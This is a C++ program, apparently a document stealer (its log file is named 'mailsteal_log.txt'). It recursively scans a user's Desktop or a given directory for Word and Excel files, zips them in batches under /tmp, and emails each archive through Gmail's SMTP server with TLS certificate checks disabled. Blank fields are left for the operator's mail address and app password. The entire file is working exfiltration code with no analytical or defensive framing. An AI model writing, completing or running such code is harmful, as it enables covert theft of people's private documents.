#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <cstdlib>
#include <curl/curl.h>

using namespace std;
namespace fs = filesystem;

// Config
constexpr uintmax_t MAX_FILE_SIZE = 24990000;
const string MAIL_ADDRESS = ""; // add your mail
const string MAIL_SUBJECT = "File Attachment Retrieval";
const string APP_PASSWORD = ""; // add your app password

// Structs
struct FileEntry {
    string path;
    uintmax_t size;
};

void log(const string& msg) {
    ofstream f("/tmp/mailsteal_log.txt", ios::app);
    f << msg << endl;
}


vector<FileEntry> findDocs(const string& root) {
    log("[+] Bat dau quet file: " + root);
    vector<FileEntry> files;
    for (const auto& entry : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            string ext = entry.path().extension().string();
            if (ext == ".docx" || ext == ".xlsx") {
                files.push_back({ entry.path().string(), entry.file_size() });
            }
        }
    }
    return files;
}


vector<vector<FileEntry>> sliceFiles(const vector<FileEntry>& files) {
    vector<vector<FileEntry>> slices;
    vector<FileEntry> current;
    uintmax_t size = 0;
    for (const auto& f : files) {
        if (size + f.size > MAX_FILE_SIZE && !current.empty()) {
            slices.push_back(current);
            current.clear();
            size = 0;
        }
        current.push_back(f);
        size += f.size;
    }
    if (!current.empty()) slices.push_back(current);
    return slices;
}

bool file_exists(const string& name) {
    return fs::exists(name);
}


void zipFiles(const vector<FileEntry>& files, const string& zipName) {
    string cmd = "zip -j -q \"" + zipName + "\"";
    for (const auto& file : files) {
        log("   - " + file.path);
        cmd += " \"" + file.path + "\"";
    }
    int ret = system(cmd.c_str());
    log("[+] zip return code: " + to_string(ret));
}

void sendZip(const string& zipPath) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        log("[-] curl_easy_init() failed!");
        return;
    }

    struct curl_slist* recipients = nullptr;
    struct curl_slist* headers = nullptr;

    // SMTP & Auth
    curl_easy_setopt(curl, CURLOPT_USERNAME, MAIL_ADDRESS.c_str());
    curl_easy_setopt(curl, CURLOPT_PASSWORD, APP_PASSWORD.c_str());
    curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    // Header
    string from = "From: <" + MAIL_ADDRESS + ">";
    string to = "To: <" + MAIL_ADDRESS + ">";
    string subject = "Subject: " + MAIL_SUBJECT;

    headers = curl_slist_append(headers, from.c_str());
    headers = curl_slist_append(headers, to.c_str());
    headers = curl_slist_append(headers, subject.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // SMTP envelope
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, ("<" + MAIL_ADDRESS + ">").c_str());
    recipients = curl_slist_append(recipients, ("<" + MAIL_ADDRESS + ">").c_str());
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    // MIME
    curl_mime* mime = curl_mime_init(curl);

    // Part 1: body text
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_data(part, "Attached zip file.", CURL_ZERO_TERMINATED);
    curl_mime_type(part, "text/plain; charset=utf-8");

    // Part 2: attachment
    part = curl_mime_addpart(mime);
    curl_mime_filedata(part, zipPath.c_str());
    curl_mime_type(part, "application/zip");
    curl_mime_filename(part, fs::path(zipPath).filename().string().c_str());
    curl_mime_encoder(part, "base64");

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    
    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        log(string("[-] curl_easy_perform() failed: ") + curl_easy_strerror(res));
    } else {
        log("[+] Email sent successfully!");
    }

    curl_slist_free_all(recipients);
    curl_slist_free_all(headers);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}
// send mail
void sendmail(const string& scan_dir) {
    auto files = findDocs(scan_dir);
    if (files.empty()) {
        cout << "No files found." << endl;
        return;
    }
    auto slices = sliceFiles(files);
    int idx = 0;
    for (const auto& slice : slices) {
        string zipName = "/tmp/docs_" + to_string(idx++) + ".zip";
        zipFiles(slice, zipName);
        if(!file_exists(zipName)){
            cerr << "[-] Khong zip duoc file " << zipName << endl;
            continue;
        }
        sendZip(zipName);
        fs::remove(zipName);
    }
    log("[+] gui mail thanh cong");
}

int main(int argc, char* argv[]) {
    string scan_dir = "/home/anhshidou/Desktop"; 
    if (argc >= 2) scan_dir = argv[1];
    sendmail(scan_dir);
    return 0;
}
